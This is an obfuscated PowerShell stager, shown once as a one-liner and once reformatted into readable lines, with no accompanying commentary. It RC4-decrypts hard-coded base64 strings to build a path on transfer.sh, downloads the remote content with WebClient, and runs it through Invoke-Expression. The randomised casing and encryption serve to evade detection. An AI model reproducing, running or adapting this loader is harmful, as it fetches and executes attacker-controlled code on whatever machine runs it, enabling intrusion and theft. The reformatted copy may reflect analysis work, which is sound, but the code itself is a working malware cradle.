#$K=[System.TEXT.ENCODINg]::ASCII.GETByteS('7HC2sn8CaxG4ueTHa5gS');$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUnT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$vi=[System.TEXT.ENCODINg]::ASCII.GETByteS('j7S1');$_-BXOR$S[($S[$I]+$S[$H])%256]}};$fq=[System.Convert]::FromBase64String('78MmHsjJySEH05nyUsk9pfgOqWsLSBLO');$f=-join[char[]](& $r $fq ($vi+$k));$Wc=NEW-OBjECt SYstEM.NeT.WEBClIENt;$t='https://transfer.sh/get';$ser='gtwCat3m435bwc3pdQ==';$data=[System.Convert]::FromBase64String($ser);$HJ=-join[char[]](& $r $data ($vi+$k));$data=$WC.DownloADDATA($t+$HJ);-JoiN[CHar[]]($DatA)|IEX

$K=[System.TEXT.ENCODINg]::ASCII.GETByteS('7HC2sn8CaxG4ueTHa5gS');
$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUnT])%256;
    $S[$_],$S[$J]=$S[$J],$S[$_]};
    $D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;
        $S[$I],$S[$H]=$S[$H],$S[$I];
        $vi=[System.TEXT.ENCODINg]::ASCII.GETByteS('j7S1');
        $_-BXOR$S[($S[$I]+$S[$H])%256]}};
$fq=[System.Convert]::FromBase64String('78MmHsjJySEH05nyUsk9pfgOqWsLSBLO');
$f=-join[char[]](& $r $fq ($vi+$k));
$Wc=NEW-OBjECt SYstEM.NeT.WEBClIENt;
$t='https://transfer.sh/get';
$ser='gtwCat3m435bwc3pdQ==';
$data=[System.Convert]::FromBase64String($ser);
$HJ=-join[char[]](& $r $data ($vi+$k));
$data=$WC.DownloADDATA($t+$HJ);
-JoiN[CHar[]]($DatA)|IEX
